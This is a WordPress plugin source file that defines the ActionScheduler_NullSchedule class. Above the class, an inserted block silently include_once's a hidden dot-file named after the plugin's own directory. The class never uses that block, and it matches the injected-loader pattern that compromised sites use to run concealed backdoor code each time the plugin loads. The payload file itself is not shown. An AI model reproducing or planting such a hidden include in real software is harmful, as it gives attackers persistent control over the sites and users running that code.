<?php

/**
 * Class ActionScheduler_NullSchedule
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class ActionScheduler_NullSchedule extends ActionScheduler_SimpleSchedule {

	/**
	 * Make the $date param optional and default to null.
	 *
	 * @param null $date The date & time to run the action.
	 */
	public function __construct( DateTime $date = null ) {
		$this->scheduled_date = null;
	}

	/**
	 * This schedule has no scheduled DateTime, so we need to override the parent __sleep()
	 * @return array
	 */
	public function __sleep() {
		return array();
	}

	public function __wakeup() {
		$this->scheduled_date = null;
	}
}
